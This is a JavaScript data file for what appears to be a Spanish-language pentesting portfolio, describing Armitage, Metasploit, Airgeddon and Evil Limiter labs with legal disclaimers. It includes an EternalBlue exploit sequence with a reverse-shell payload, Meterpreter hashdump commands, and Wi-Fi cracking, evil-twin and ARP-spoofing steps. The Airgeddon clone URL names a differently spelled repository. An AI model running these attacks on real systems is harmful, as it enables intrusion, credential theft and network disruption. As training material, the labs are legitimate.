export const labsData = [  {
    slug: "armitage",
    title: "Explotación de Vulnerabilidades en Windows con Armitage",
    description: "Explotación gráfica de vulnerabilidades y gestión visual de sesiones con Metasploit. Demostración del proceso completo de pentesting desde el escaneo hasta la post-explotación.",
    date: "Martes, 11 de marzo de 2025",
    badges: ["Pentesting Ofensivo", "Explotación de Vulnerabilidades", "Red Team", "Post-Explotación", "Windows"],
    details: `<div class="space-y-6">
      <div class="bg-card rounded-lg p-6 mb-8 shadow-lg">
        <h2 class="text-2xl font-semibold mb-4">Objetivo Principal</h2>
        <p class="text-muted-foreground">
          Demostrar el proceso de identificación y explotación de vulnerabilidades en un sistema Windows utilizando la interfaz gráfica de Armitage, 
          que facilita el uso del Metasploit Framework. Este laboratorio tiene fines educativos para comprender la metodología de pentesting y las 
          capacidades de las herramientas de explotación.
        </p>
      </div>

      <div class="mb-8">
        <h3 class="text-xl font-semibold mb-4">Inicio Rápido</h3>
        <div class="bg-muted p-4 rounded-md overflow-x-auto mb-4">
          <pre>sudo apt update && sudo apt install armitage
sudo systemctl start postgresql
sudo msfdb init
sudo armitage</pre>
        </div>
      </div>

      <div class="mb-8">
        <h3 class="text-xl font-semibold mb-4">Funcionalidades Principales</h3>
        <ul class="list-disc pl-6 space-y-2">
          <li>🔍 Escaneo de objetivos y detección automática de vulnerabilidades</li>
          <li>🎯 Selección intuitiva de exploits y payloads</li>
          <li>💼 Gestión visual de sesiones de Meterpreter</li>
          <li>🔐 Post-explotación y pivoting</li>
          <li>📊 Visualización de la red y objetivos</li>
          <li>🤝 Trabajo en equipo y colaboración</li>
        </ul>
      </div>

      <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
        <div>
          <h3 class="text-xl font-semibold mb-4">Comandos Útiles de Meterpreter</h3>
          <ul class="list-disc pl-6 space-y-2 text-muted-foreground">
            <li><code>sysinfo</code> - Información del sistema</li>
            <li><code>pwd</code> - Directorio actual</li>
            <li><code>screenshot</code> - Captura de pantalla</li>
            <li><code>migrate &lt;PID&gt;</code> - Migrar proceso</li>
            <li><code>hashdump</code> - Extraer hashes</li>
          </ul>
        </div>
        <div>
          <h3 class="text-xl font-semibold mb-4">Técnicas de Post-Explotación</h3>
          <ul class="list-disc pl-6 space-y-2 text-muted-foreground">
            <li>Escalada de privilegios</li>
            <li>Persistencia</li>
            <li>Recolección de credenciales</li>
            <li>Pivoting de red</li>
            <li>Evasión de defensas</li>
          </ul>
        </div>
      </div>

      <div class="bg-destructive/10 p-6 rounded-lg mt-8">
        <h4 class="text-lg font-semibold mb-2 text-destructive">⚠️ Aviso Legal Importante</h4>
        <p class="text-muted-foreground">
          Este laboratorio debe realizarse únicamente en un entorno controlado y con permiso explícito.
          La explotación no autorizada de sistemas puede tener graves consecuencias legales.
          El objetivo es educativo para comprender las vulnerabilidades y mejorar las defensas.
        </p>
      </div>
    </div>`,
    images: [
      "/lab1/armitage/1.png",
      "/lab1/armitage/2.png",
      "/lab1/armitage/3.png",
      "/lab1/armitage/4.png",
      "/lab1/armitage/5.png",
      "/lab1/armitage/6.png",
      "/lab1/armitage/7.png"
    ],
    links: [
      { label: "Documentación de Armitage", url: "http://www.fastandeasyhacking.com/" },
      { label: "Metasploit Framework", url: "https://github.com/rapid7/metasploit-framework" }
    ]
  },  {
    slug: "metasploit",
    title: "Explotación de Vulnerabilidades en Windows con Metasploit Framework (CLI)",
    description: "Ejecución detallada de exploits y payloads utilizando la interfaz de línea de comandos (CLI) de Metasploit Framework para pentesting profesional.",
    date: "Domingo, 6 de abril de 2025",
    badges: ["Post-Explotación", "Escalamiento de Privilegios", "Análisis de Vulnerabilidades", "CLI", "Windows"],
    details: `<div class="space-y-6">
      <div class="bg-card rounded-lg p-6 mb-8 shadow-lg">
        <h2 class="text-2xl font-semibold mb-4">Objetivo Principal</h2>
        <p class="text-muted-foreground">
          Demostrar el proceso de identificación y explotación de vulnerabilidades en un sistema Windows utilizando 
          la interfaz de línea de comandos (CLI) del Metasploit Framework. Este laboratorio tiene fines educativos 
          para comprender en profundidad el funcionamiento de Metasploit y la metodología de pentesting.
        </p>
      </div>

      <div class="mb-8">
        <h3 class="text-xl font-semibold mb-4">Inicio Rápido</h3>
        <div class="bg-muted p-4 rounded-md overflow-x-auto mb-4">
          <pre>sudo systemctl start postgresql
sudo msfdb init
msfconsole</pre>
        </div>
      </div>

      <div class="mb-8">
        <h3 class="text-xl font-semibold mb-4">Comandos Fundamentales</h3>
        <ul class="list-disc pl-6 space-y-2">
          <li>🔍 <code>db_nmap -sV &lt;IP&gt;</code> - Escaneo de servicios</li>
          <li>🔎 <code>search &lt;término&gt;</code> - Búsqueda de exploits</li>
          <li>📌 <code>use &lt;exploit&gt;</code> - Selección de exploit</li>
          <li>⚙️ <code>set RHOST/LHOST</code> - Configuración de parámetros</li>
          <li>🎯 <code>exploit</code> - Ejecución del exploit</li>
          <li>💻 <code>sessions -i &lt;ID&gt;</code> - Gestión de sesiones</li>
        </ul>
      </div>

      <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
        <div>
          <h3 class="text-xl font-semibold mb-4">Comandos de Meterpreter</h3>
          <div class="bg-muted p-4 rounded-md overflow-x-auto">
            <pre>sysinfo      # Info del sistema
getuid       # Usuario actual
ps           # Listar procesos
hashdump     # Extraer hashes
migrate      # Migrar proceso
shell        # Obtener shell</pre>
          </div>
        </div>
        <div>
          <h3 class="text-xl font-semibold mb-4">Ejemplo de Explotación</h3>
          <div class="bg-muted p-4 rounded-md overflow-x-auto">
            <pre>use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set payload windows/x64/meterpreter/reverse_tcp
exploit</pre>
          </div>
        </div>
      </div>

      <div class="bg-destructive/10 p-6 rounded-lg mt-8">
        <h4 class="text-lg font-semibold mb-2 text-destructive">⚠️ Aviso Legal Importante</h4>
        <p class="text-muted-foreground">
          Este laboratorio debe realizarse únicamente en un entorno controlado y con permiso explícito.
          La explotación no autorizada de sistemas puede tener graves consecuencias legales. El objetivo
          es puramente educativo para comprender el funcionamiento interno de Metasploit y mejorar las
          defensas de los sistemas.
        </p>
      </div>
    </div>`,
    images: [
      "/lab1/metasploit/1.png"
    ],
    links: [
      { label: "Documentación de Metasploit", url: "https://docs.metasploit.com/" },
      { label: "Metasploit Framework Github", url: "https://github.com/rapid7/metasploit-framework" }
    ]
  },
  {    slug: "airgeddon",
    title: "Auditoría Wi-Fi con Airgeddon",
    description: "Evaluación de seguridad en redes Wi-Fi mediante ataques WPS/WPA2, captura de handshakes y técnicas de desautenticación y spoofing.",
    date: "Viernes, 29 de noviembre de 2024",
    badges: ["Pentesting Wi-Fi", "Análisis de Protocolos", "Ingeniería Social"],
    details: `<div class="space-y-6">
      <p>Demostración del proceso de auditoría de seguridad en redes Wi-Fi utilizando la suite Aircrack-ng, facilitada por la herramienta Airogeddon. Este laboratorio tiene fines educativos y de concienciación sobre la seguridad de las redes inalámbricas.</p>
      
      <h3 class="text-xl font-semibold">Instalación</h3>
      <pre class="bg-muted p-4 rounded-md overflow-x-auto">git clone https://github.com/v1s1d/Airogeddon.git
cd Airogeddon
sudo bash airogeddon.sh</pre>

      <h3 class="text-xl font-semibold">Funcionalidades Principales</h3>
      <ul class="list-disc pl-6 space-y-2">
        <li>WEP Cracking: Obtención de claves WEP</li>
        <li>WPA/WPA2 Cracking: Recuperación de contraseñas mediante fuerza bruta o diccionario</li>
        <li>WPS PIN Attack: Explotación de vulnerabilidades WPS</li>
        <li>Deauthentication Attack: Desconexión de clientes para forzar handshakes</li>
        <li>Man-in-the-Middle (MITM) Attacks: Intercepción de comunicaciones</li>
        <li>Evil Twin Attacks: Creación de puntos de acceso falsos</li>
      </ul>

      <div class="bg-destructive/10 p-6 rounded-lg mt-8">
        <h4 class="text-lg font-semibold mb-2 text-destructive">Aviso Legal Importante</h4>
        <p>Las técnicas demostradas en este laboratorio deben utilizarse únicamente en redes para las que se tenga permiso explícito. El uso no autorizado de estas herramientas puede tener consecuencias legales.</p>
      </div>
    </div>`,
    images: [
      "/lab1/airgeddon/1.png",
      "/lab1/airgeddon/2.png",
      "/lab1/airgeddon/3.png",
      "/lab1/airgeddon/4.png",
      "/lab1/airgeddon/5.png"
    ],
    links: [
      { label: "Repositorio de Airgeddon", url: "https://github.com/v1s1d/Airogeddon" }
    ]
  },
  {    slug: "evillimiter",
    title: "Limitación de Ancho de Banda en la Red con Evil Limiter",
    description: "Demostración práctica de control de ancho de banda en redes LAN mediante técnicas de ARP spoofing y herramientas especializadas de gestión de tráfico.",
    date: "Jueves, 17 de octubre de 2024",
    badges: ["Análisis de Red", "Control de Tráfico", "ARP Spoofing"],
    details: `<div class="space-y-6">
      <div class="bg-card rounded-lg p-6 mb-8 shadow-lg">
        <h2 class="text-2xl font-semibold mb-4">Objetivo Principal</h2>
        <p class="text-muted-foreground">
          Demostrar cómo utilizar Evil Limiter para limitar el ancho de banda de otros dispositivos conectados a la misma red local (LAN).
          Este laboratorio tiene fines educativos y de concienciación sobre las posibles vulnerabilidades en redes compartidas.
        </p>
      </div>

      <div class="mb-8">
        <h3 class="text-xl font-semibold mb-4">Instalación</h3>
        <div class="bg-muted p-4 rounded-md overflow-x-auto mb-4">
          <pre>git clone https://github.com/jafarlihi/evil-limiter
cd evil-limiter
chmod +x evil-limiter.py
sudo python3 evil-limiter.py</pre>
        </div>
      </div>

      <div class="mb-8">
        <h3 class="text-xl font-semibold mb-4">Solución de Errores Comunes</h3>
        <div class="bg-muted p-4 rounded-md overflow-x-auto mb-4">
          <p class="font-semibold mb-2">Error de NetfilterQueue:</p>
          <pre>sudo apt-get install python3-netfilterqueue</pre>
        </div>
      </div>

      <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
        <div>
          <h3 class="text-xl font-semibold mb-4">Pasos Principales</h3>
          <ul class="list-disc pl-6 space-y-2 text-muted-foreground">
            <li>Selección de interfaz de red</li>
            <li>Escaneo de dispositivos en la red</li>
            <li>Selección del dispositivo objetivo</li>
            <li>Configuración de límites de ancho de banda</li>
            <li>Monitoreo del tráfico en tiempo real</li>
          </ul>
        </div>
        <div>
          <h3 class="text-xl font-semibold mb-4">Comandos Útiles</h3>
          <ul class="list-disc pl-6 space-y-2 text-muted-foreground">
            <li><code>limit</code> - Limitar ancho de banda</li>
            <li><code>block</code> - Bloquear acceso a internet</li>
            <li><code>free all</code> - Liberar todos los hosts</li>
            <li><code>free [ID]</code> - Liberar host específico</li>
          </ul>
        </div>
      </div>

      <div class="bg-destructive/10 p-6 rounded-lg mt-8">
        <h4 class="text-lg font-semibold mb-2 text-destructive">Aviso Legal Importante</h4>
        <p class="text-muted-foreground">
          Esta herramienta debe utilizarse únicamente en redes para las que se tenga permiso explícito.
          El uso de técnicas de ARP spoofing puede ser detectado por herramientas de seguridad y su uso
          no autorizado puede tener consecuencias legales.
        </p>
      </div>
    </div>`,    images: [
      "/lab1/evillimiter/1.png",
      "/lab1/evillimiter/2.png",
      "/lab1/evillimiter/3.png",
      "/lab1/evillimiter/4.png",
      "/lab1/evillimiter/5.png"
    ],
    links: [
      { label: "Repositorio Evil Limiter", url: "https://github.com/jafarlihi/evil-limiter" }
    ]
  }
];
